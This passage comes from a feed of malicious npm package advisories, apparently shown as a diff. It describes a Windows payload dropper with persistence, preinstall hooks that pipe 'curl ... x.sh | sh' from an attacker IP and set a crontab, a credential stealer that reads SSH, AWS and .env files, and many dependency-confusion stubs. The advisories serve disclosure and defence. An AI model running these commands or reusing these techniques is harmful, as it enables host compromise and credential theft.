-      "summary": "On require('mfa-js'), lib/cache.js executes a Windows-gated IIFE that downloads a JavaScript payload from https://limbomail.com/api/attachment/r_Ea6rT_kGfT.o7nh0aBVvDQWmOG47NPBQ3pUjd_uHeiw to %APPDATA%\\Microsoft\\Windows\\WinSxS\\Backup\\winsvc.js and launches it by spawning wscript.exe against a VBS wrapper that invokes node.exe. Sensitive strings (child_process, https, spawn, wscript.exe, AppData, node.exe, winsvc.js, registry keys, the payload URL) are hidden via \\xNN hex escapes and a base64 array decoded at runtime. lib/totp.js installs four independent persistence mechanisms for the dropped payload: an HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run value named WinSvcHost, an HKCU\\Environment UserInitMprLogonScript entry, a Startup-folder wsvc.vbs, and a scheduled task at \\Microsoft\\Windows\\Shell\\WinSvcHost triggered onlogon; the dropped file is hidden with attrib +h +s. cache.js also schedules a setInterval every 7,200,000 ms that HEAD-checks the remote URL, downloads new bytes when the size changes, kills the previous process via a stored PID file, and relaunches — providing continuous mutable remote code execution. The behavior fires at library load time via main's require('./lib/cache') with no install script required.\n\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://github.com/advisories/GHSA-2p92-fvvr-75hj",
-        "https://www.npmjs.com/package/mfa-js/v/1.0.4",
-        "https://www.npmjs.com/package/mfa-js/v/1.0.3"
-      ],
-      "vulnerableProducts": [
-        "mfa-js npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15542",
-      "summary": "package.json declares a dependency whose key equals the package's own name (paper-password-input) and whose value is a bare HTTPS URL, https://repo.securityctrl.com/paper-password-input, rather than a registry version range. On npm install, npm fetches whatever bytes are served at that URL with no version pin and no integrity check, and executes any lifecycle scripts inside the fetched tarball. The shipped index.js is an inert stub, so the manifest itself is the entire published surface — whoever controls repo.securityctrl.com can deliver arbitrary code to every installer, and the self-named dependency shape is consistent with a dependency-confusion lure targeting an internal package name.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/paper-password-input/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "paper-password-input npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15507",
-      "summary": "grafeno-pix@1.0.0 declares a preinstall hook that runs `curl -s 216.126.236.46/x.sh | sh`, fetching a shell script from a bare IP over plain HTTP and executing it as the installer on `npm install`. The same hook installs a crontab entry (`*/30 * * * * curl -s 216.126.236.46/x.sh | sh`) that re-fetches and executes the remote script every 30 minutes, providing persistent remote code delivery to the installer's host. The endpoint is an anonymous bare-IP address unrelated to any package publisher and the fetched content is unpinned and integrity-unchecked, so whatever bytes 216.126.236.46 returns run as the user performing the install, indefinitely.\n\nThe OpenSSF Package Analysis project identified 'grafeno-pix' @ 1.0.1 (npm) as malicious.\n\nIt is considered malicious because:\n\n- The package executes one or more commands associated with malicious behavior.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/grafeno-pix/v/1.0.0"
-      ],
-      "vulnerableProducts": [
-        "grafeno-pix npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15501",
-      "summary": "package.json declares a preinstall script that shells out via child_process to curl http://216.126.236.46/x.sh and pipe the response into /bin/bash, running attacker-controlled code on the installer's machine at npm install time. The fetch is unpinned, uses plain HTTP to a bare IP with no integrity check, and is wrapped in a try/catch that suppresses errors. The shipped index.js is a one-line stub exporting a no-op request() function, so the package provides no legitimate functionality — the manifest lifecycle hook is the entire payload, and the 'API client' framing is a cover story.\n\nThe OpenSSF Package Analysis project identified 'grafeno-api' @ 1.0.1 (npm) as malicious.\n\nIt is considered malicious because:\n\n- The package executes one or more commands associated with malicious behavior.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/grafeno-api/v/1.0.0"
-      ],
-      "vulnerableProducts": [
-        "grafeno-api npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15491",
-      "summary": "index.js contains an IIFE that fires on require() and walks the installer's home and project directories collecting.env* files (filtered by /PRIVATE|SECRET|MNEMONIC|KEY|AWS_|RPC_|INFURA|ALCHEMY|TOKEN/i), ~/.aws/credentials, ~/.aws/config, ~/.npmrc, ~/.gitconfig, ~/.git-credentials, ~/.config/gh/hosts.yml, ~/.bash_history, ~/.zsh_history, ~/.ssh/id_*, ~/.foundry/keystores, AWS SSO/CLI caches, and credential-shaped process.env entries. The collected data is gzip+base64 packed and PUT to api.github.com/repos/wutang344/env-diagnostics/contents/d/dp-<rand>.json using a hardcoded Bearer token; destination host, repo path, User-Agent, commit message, and token are XOR-obfuscated with key 'nm-eip7-2026'. After scheduling the upload, a scrub() routine rewrites index.js on disk to remove the payload block between /* domain-probe:start */ and /* domain-probe:end */ markers, leaving only benign EIP-712 helper code. Execution is skipped when process.env.CI or GITHUB_ACTIONS is set and an idempotency marker at os.tmpdir()/.e712-probe.json ensures the exfil runs at most once per machine, evading sandbox detonation and repeat detection. The package is advertised as a dependency-free EIP-712 helper; the credential harvest and exfiltration are undocumented.\n\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://github.com/advisories/GHSA-p5jf-vqp6-95h5",
-        "https://www.npmjs.com/package/eip712-lite/v/1.0.2",
-        "https://www.npmjs.com/package/eip712-lite/v/1.0.1"
-      ],
-      "vulnerableProducts": [
-        "eip712-lite npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15527",
-      "summary": "package.json declares a self-named dependency 'aura-instrumentation' whose source is the bare URL https://repo.securityctrl.com/aura-instrumentation rather than a registry version range. On npm install, npm fetches whatever tarball that host returns, unpinned and with no integrity check, and runs any lifecycle scripts inside it. The shipped source is an inert stub and a placeholder README, so the manifest line is the entire published surface: install-time code execution on the installer's machine is delegated to whoever controls repo.securityctrl.com. The self-referential dependency name and an implausibly high version (45.0.0) for an otherwise empty package are consistent with a dependency-confusion lure aimed at winning resolution against an internal package of the same name.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/aura-instrumentation/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "aura-instrumentation npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15539",
-      "summary": "package.json line 11 declares a dependency whose source is a bare URL rather than a registry version range: \"loading-performance-instrumentation\": \"https://repo.securityctrl.com/loading-performance-instrumentation\". The dependency key equals the package's own name (dependency-confusion shape). On `npm install`, npm fetches whatever bytes repo.securityctrl.com returns for that path and installs them into node_modules, running any lifecycle scripts contained inside the fetched tarball. There is no version pin, no integrity hash, and no commit SHA — the content at that URL can change at any time. The README frames the package as a placeholder to prevent dependency confusion, but the manifest itself resolves the same name to a third-party host, contradicting that framing. The shipped code in this tarball is an inert stub; the manifest URL is the entire install-time payload path.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/loading-performance-instrumentation/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "loading-performance-instrumentation npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15528",
-      "summary": "package.json declares a dependency whose key equals the package's own name (`axis-datagrid`) and whose source is the bare HTTPS URL `https://repo.securityctrl.com/axis-datagrid` instead of a registry version range. On `npm install`, npm fetches whatever bytes that URL returns and installs them, running any lifecycle scripts they contain, with no version pin and no integrity check. The shipped index.js is an inert stub, so the manifest itself is the entire install-time payload: whoever controls repo.securityctrl.com controls code executed on the installer's machine. The self-referential dependency name (dependency-confusion shape) and an implausibly high version (45.0.0) for a package whose actual code is a placeholder are consistent with a package designed to win resolution against an internal name and pull code from an off-registry host.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/axis-datagrid/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "axis-datagrid npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15545",
-      "summary": "package.json line 11 declares a dependency whose key equals the package's own name (ux-metrics-client-interaction-subscriber) and whose value is a bare HTTPS URL to a non-registry host: https://repo.securityctrl.com/ux-metrics-client-interaction-subscriber. On npm install, npm fetches whatever tarball that URL returns and installs it, running any lifecycle scripts contained in it, with no version pin, no integrity hash, and no signature check. The shipped index.js is an inert stub, so the manifest itself is the entire delivery mechanism: control of repo.securityctrl.com equals code execution on the installer's machine. The self-name dependency-confusion shape (dependency key equals the package's own name, implausibly high version 45.0.0) is consistent with an attempt to win resolution against an internal package of the same name.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/ux-metrics-client-interaction-subscriber/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "ux-metrics-client-interaction-subscriber npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15529",
-      "summary": "package.json declares a dependency whose key equals this package's own name (bui-react-10themes) and whose value is a bare HTTPS URL (https://repo.securityctrl.com/bui-react-10themes) rather than a registry version range. There is no version pin and no integrity hash. On npm install, npm fetches whatever tarball is served from repo.securityctrl.com and installs it, executing any lifecycle scripts it contains. The shipped in-tree code is an inert stub, so the manifest edge is the entire installed surface. The self-name pattern (dependency confusion shape) combined with the implausibly high 45.0.0 version is consistent with an attempt to win resolution against an internal package of the same name.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/bui-react-10themes/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "bui-react-10themes npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15540",
-      "summary": "package.json declares a dependency whose key (\"mkt-ui-library\") equals the package's own name and whose value is a bare HTTPS URL, https://repo.securityctrl.com/mkt-ui-library, instead of a registry version range. On `npm install`, npm fetches whatever tarball is served at that URL and installs it, executing any lifecycle scripts inside it, with no version pin and no integrity check. The shipped source is an inert stub (index.js only performs a console.log), so the manifest line is the entire payload: whoever controls repo.securityctrl.com controls the code that runs on the installer's machine. The self-referencing dependency name (key equals the package's own name at an implausibly high version 45.0.0) is a dependency-confusion shape that biases resolvers toward this artifact over any legitimate internal package.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/mkt-ui-library/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "mkt-ui-library npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15534",
-      "summary": "package.json declares a single dependency whose value is a bare HTTP URL (https://repo.securityctrl.com/firestore-lite) rather than a registry version range. On `npm install`, npm fetches and installs whatever tarball that URL returns, running any lifecycle scripts contained in it, with no version pin and no integrity check. The dependency key is the package's own name, a dependency-confusion shape, and the shipped index.js is an inert stub — the manifest line is the entire published payload. The package name mimics the legitimate Firebase 'firestore-lite' module, and the version 45.0.0 is implausibly high for that name, consistent with an attempt to win version resolution against an internal package.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/firestore-lite/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "firestore-lite npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15538",
-      "summary": "package.json at line 11 declares a dependency whose key equals the package's own name (librastandardlib) and whose value is an off-registry HTTPS URL (https://repo.securityctrl.com/librastandardlib) instead of a registry version range. On `npm install`, npm fetches whatever bytes that URL returns and installs them as the resolved dependency, running any lifecycle scripts inside with no version pin and no integrity check. The implausibly high version (45.0.0) and the self-referential dependency name are consistent with a dependency-confusion shape designed to win resolution against an internal package. The shipped index.js is an inert stub, so the manifest URL is the entire delivery mechanism — whoever controls repo.securityctrl.com controls code executed on the installer's machine at install time.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/librastandardlib/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "librastandardlib npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15546",
-      "summary": "package.json declares a dependency whose key equals this package's own name (`vui-gateway`) and whose source is an off-registry HTTPS URL, `https://repo.securityctrl.com/vui-gateway`. On `npm install`, npm resolves that URL and installs whatever bytes it returns, running any lifecycle scripts contained within. The source is not the npm registry, there is no version pin, and no integrity hash is present, so the content is mutable and unauthenticated — whoever controls `repo.securityctrl.com` controls code execution on the installer's machine. The shipped index.js is an inert stub; the manifest itself is the entire attack surface. The dependency-key-equals-package-name shape is characteristic of dependency-confusion attacks intended to shadow an internal package of the same name.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/vui-gateway/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "vui-gateway npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15537",
-      "summary": "package.json line 11 declares a dependency whose key equals the package's own name (`jira-projects-backbone`) with a value that is a bare HTTPS URL, `https://repo.securityctrl.com/jira-projects-backbone`, instead of a registry version range. On `npm install`, npm fetches whatever tarball that URL returns and installs it, running any lifecycle scripts it contains, with no version pin and no integrity check. The shipped source in this package is an inert stub, so the manifest itself is the entire install-time surface — every install resolves to attacker-controlled code from repo.securityctrl.com. The self-name reuse and implausibly high version (45.0.0) also give this manifest a dependency-confusion shape against any internal package named `jira-projects-backbone`.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/jira-projects-backbone/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "jira-projects-backbone npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15533",
-      "summary": "package.json declares the package's own name 'data-value' as a dependency whose source is an arbitrary HTTPS URL (https://repo.securityctrl.com/data-value) rather than a registry version range. On npm install, npm fetches whatever bytes that URL returns and runs any lifecycle scripts inside the fetched tarball, with no version pin and no integrity check. The dependency key matching the package's own name is a dependency-confusion shape that forces resolution to this off-registry source. The shipped index.js is an inert stub, so the manifest line itself is the entire published payload — whoever controls repo.securityctrl.com controls code executed on the installer's machine at install time.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/data-value/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "data-value npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15541",
-      "summary": "package.json declares a dependency whose key (`oit-lib-oracle-util`) matches this package's own name and whose value is a bare HTTPS URL — `https://repo.securityctrl.com/oit-lib-oracle-util` — instead of a registry version range. On `npm install`, npm fetches whatever bytes that URL returns at install time and installs them, running any lifecycle scripts inside the fetched artifact. The source is unpinned, has no integrity hash, and is unrelated to the npm registry; the host `repo.securityctrl.com` is not a known registry mirror and has no association with a declared publisher. The shipped index.js is an inert stub, so the manifest itself is the entire delivery mechanism. The self-referential name and implausibly high version (45.0.0) are consistent with a dependency-confusion lure designed to win resolution against an internal package of the same name.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/oit-lib-oracle-util/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "oit-lib-oracle-util npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15535",
-      "summary": "package.json line 11 declares the dependency 'gridster-coords' as the bare HTTPS URL https://repo.securityctrl.com/gridster-coords instead of a registry version range. On npm install, npm fetches whatever bytes that URL serves, with no version pin and no integrity check, and executes any lifecycle scripts contained in the fetched tarball on the installer's machine. The dependency key equals the package's own name (dependency-confusion shape), the version '45.0.0' is implausibly high for a package of this name, and the host repo.securityctrl.com is unrelated to any npm registry or documented publisher. The shipped source is otherwise an inert stub, so the manifest line is the entire delivery mechanism.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/gridster-coords/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "gridster-coords npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15525",
-      "summary": "package.json declares a single dependency whose source is a bare HTTPS URL (https://repo.securityctrl.com/amplitude-react-native) rather than a registry version range, with no version pin and no integrity hash. The dependency key matches the package's own name, a dependency-confusion shape. On npm install, npm fetches whatever tarball that host currently returns and installs it, executing any lifecycle scripts contained in the fetched artifact. The shipped index.js is an inert stub, so the manifest itself is the entire published payload and the operator of repo.securityctrl.com controls code executed on installers' machines.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/amplitude-react-native/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "amplitude-react-native npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15519",
-      "summary": "package.json line 11 declares a self-referential dependency whose source is a bare HTTP URL rather than a registry version range: \"qbo-ui-services\": \"https://repo.securityctrl.com/qbo-ui-services\". On npm install, npm fetches whatever tarball that URL returns and installs it, executing any lifecycle scripts contained inside, with no version pin and no integrity hash. The shipped index.js is an inert stub, so the manifest line is the entire published payload. The dependency key equals this package's own name and the version marker (45.0.0) is implausibly high, matching a dependency-confusion shape intended to win resolution against an internal package. The host repo.securityctrl.com is not a known npm registry and is unrelated to any declared repository or homepage.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/qbo-ui-services/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "qbo-ui-services npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15500",
-      "summary": "package.json line 11 declares a dependency whose source is the bare HTTPS URL https://repo.securityctrl.com/framework-zero instead of a registry version range. On npm install this URL is fetched and installed, running any lifecycle scripts in the returned tarball, with no version pin and no integrity check. The dependency key equals the package's own name (framework-zero), a dependency-confusion shape where the manifest itself is the delivery mechanism, and the pinned version 45.0.0 is implausibly high for the name — consistent with a resolution-winning squat against an internal package. The host repo.securityctrl.com is unrelated to any npm registry and can serve arbitrary content that changes at any time after publish.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/framework-zero/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "framework-zero npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15513",
-      "summary": "package.json declares a dependency whose value is a bare HTTPS URL (https://repo.securityctrl.com/katal-logger) instead of a registry version range. On npm install, npm fetches whatever bytes that URL currently returns and installs them as the package, executing any lifecycle scripts contained inside. There is no version pin, no integrity/hash check, and the host is unrelated to the npm registry, so control over repo.securityctrl.com equates to code execution on the installing machine. The dependency key equals the package's own name (dependency-confusion shape) and the shipped index.js is an inert stub, so the manifest line is the entire delivery mechanism — the absence of scripts in this tarball does not mitigate the fetch.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/katal-logger/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "katal-logger npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15518",
-      "summary": "package.json line 11 declares a dependency whose source is the arbitrary HTTPS URL https://repo.securityctrl.com/payments-ui-services instead of a registry version range. On `npm install`, npm fetches whatever tarball that host currently serves and installs it, executing any lifecycle scripts it contains, with no version pin and no integrity hash — the operator of repo.securityctrl.com controls code execution on every installer's machine. Aggravators: the dependency key equals the package's own name (dependency-confusion shape), the version 45.0.0 is implausibly high for a package whose shipped index.js is a one-line stub and whose README self-describes as a placeholder, and the host repo.securityctrl.com is unrelated to any declared publisher or homepage. The manifest URL is effectively the entire payload delivered to installers.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/payments-ui-services/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "payments-ui-services npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15499",
-      "summary": "package.json at line 11 declares the package's own name as a dependency whose source is the bare URL https://repo.securityctrl.com/calcite-web instead of a registry version range. On npm install, npm fetches whatever tarball that URL returns and installs it with no version pin and no integrity check, executing any lifecycle scripts inside the fetched artifact. The shipped index.js is an inert stub, so the manifest itself is the entire install-time payload, and whoever controls repo.securityctrl.com controls code that runs on every installer. The dependency key equals the package's own name (dependency-confusion shape), and the implausibly high version (45.0.0) is consistent with an override attempting to win resolution against an internal package of the same name.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/calcite-web/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "calcite-web npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15524",
-      "summary": "package.json at line 11 declares a dependency whose key equals the package's own name (`tabbables`) and whose value is the raw HTTPS URL `https://repo.securityctrl.com/tabbables` rather than a registry version range. On `npm install`, npm fetches whatever tarball that URL currently serves and installs it, executing any lifecycle scripts it contains, with no version pin, no integrity/hash check, and no registry provenance. The shipped index.js is an inert stub, so the manifest URL is the sole payload-delivery mechanism; the tarball's behavior can be changed at any time by whoever controls repo.securityctrl.com. The self-referential dependency key also produces a dependency-confusion shape (an implausibly high 45.0.0 version competing with any internal package of the same name).",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/tabbables/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "tabbables npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15512",
-      "summary": "package.json declares a dependency whose key (`jsb-adapter`) equals this package's own name and whose value is the bare HTTPS URL `https://repo.securityctrl.com/jsb-adapter` instead of a registry version range. On `npm install`, npm fetches whatever tarball that host currently returns, unpinned and with no integrity check, and runs any lifecycle scripts inside it — so the code executed on the installer is whoever controls `repo.securityctrl.com` at install time, not the published tarball. The shipped index.js is an inert stub, so the manifest line is the entire published payload. Aggravating shape: the dependency key matches the package's own name and the version `45.0.0` is implausibly high, consistent with dependency-confusion targeting an internal package of the same name.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/jsb-adapter/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "jsb-adapter npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15495",
-      "summary": "package.json declares a self-named dependency alimama-minisite whose value is the off-registry URL https://repo.securityctrl.com/alimama-minisite instead of a semver range from the npm registry. On npm install, npm fetches whatever bytes that host returns and installs them, executing any lifecycle scripts contained in the fetched artifact. The dependency is unpinned and has no integrity check, so the returned content can change at any time. The dependency key equals the package's own name (dependency-confusion shape), and an implausibly high version (45.0.0) is set to win resolution against an internal package of the same name. The shipped index.js is an inert stub; the manifest line is the entire installer-side effect.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/alimama-minisite/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "alimama-minisite npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15517",
-      "summary": "package.json declares a dependency whose key equals the package's own name (`one-intuit-help-system-utils`) and whose value is a bare HTTPS URL (`https://repo.securityctrl.com/one-intuit-help-system-utils`) rather than a registry version range. On `npm install`, npm resolves this URL, downloads whatever tarball bytes the host returns, and installs them — running any lifecycle scripts contained in that tarball — with no version pin, no integrity check, and no publisher verification. The shipped package content is an inert stub, so the manifest line itself is the entire published surface: the code that actually executes on installers comes from repo.securityctrl.com at install time and can change at any moment. The self-referential dependency name (dependency-confusion shape) and an implausibly high version (45.0.0) are consistent with a package designed to win resolution against an internal package of the same name.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/one-intuit-help-system-utils/v/30.0.0"
-      ],
-      "vulnerableProducts": [
-        "one-intuit-help-system-utils npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15515",
-      "summary": "package.json declares a dependency whose value is a bare HTTPS URL (https://repo.securityctrl.com/npm-extension) rather than a registry version range. On npm install, npm fetches whatever tarball that host returns and executes any lifecycle scripts inside it, unpinned and without integrity verification. The dependency key equals the package's own name, producing a dependency-confusion shape in which resolution is forced through the off-registry host. The shipped index.js is an inert stub, so the manifest line is the entire published payload — the fetched third-party code is what actually runs on installer machines.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/npm-extension/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "npm-extension npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15514",
-      "summary": "package.json line 11 declares the package's own name 'mintel-taskbar' as a dependency whose source is the bare HTTPS URL https://repo.securityctrl.com/mintel-taskbar, not a registry version range. On `npm install`, npm resolves this dependency by fetching whatever tarball that URL returns and installs it — running any lifecycle scripts inside the fetched tarball — with no version pin and no integrity check. Whoever controls repo.securityctrl.com therefore controls code executed on every installer's machine. The self-referential shape (dependency key equals the package's own name) combined with an implausibly high version (45.0.0) is consistent with a dependency-confusion lure that resolves against an internal package of the same name.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/mintel-taskbar/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "mintel-taskbar npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15497",
-      "summary": "package.json declares a dependency whose key is the package's own name (`amplitude-session-replay`) and whose value is a plain HTTPS URL, `https://repo.securityctrl.com/amplitude-session-replay`, instead of a registry version range. On `npm install`, npm fetches the tarball bytes returned by that URL and installs whatever it contains, including running any lifecycle scripts inside — with no version pin, no integrity hash, and no registry vetting. The shipped source in the published tarball is an inert stub, so the manifest itself is the delivery mechanism: whoever controls repo.securityctrl.com controls code executed on the installer's machine at install time. The self-referential dependency name (dependency-confusion shape) also encourages resolvers to prefer this entry over any legitimately-named `amplitude-session-replay` package. The host is unrelated to Amplitude's own domains.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/amplitude-session-replay/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "amplitude-session-replay npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15510",
-      "summary": "package.json declares the package's own name as a dependency whose source is the bare HTTPS URL https://repo.securityctrl.com/integration-amplitude rather than a registry version range. On npm install, npm fetches whatever bytes that host serves and installs them, executing any lifecycle scripts contained inside, with no version pin and no integrity check. The shipped index.js is a 3-line stub, so this manifest line is the sole install-time code path. The dependency key matching the package's own name is the dependency-confusion shape, and the implausibly high version (45.0.0) is consistent with an attempt to win resolution against an internal package of the same name. Whoever controls repo.securityctrl.com controls code executed on the installer's machine.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-28",
-      "modified": "2026-08-28",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/integration-amplitude/v/45.0.0"
-      ],
-      "vulnerableProducts": [
-        "integration-amplitude npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "MAL-2026-15511",
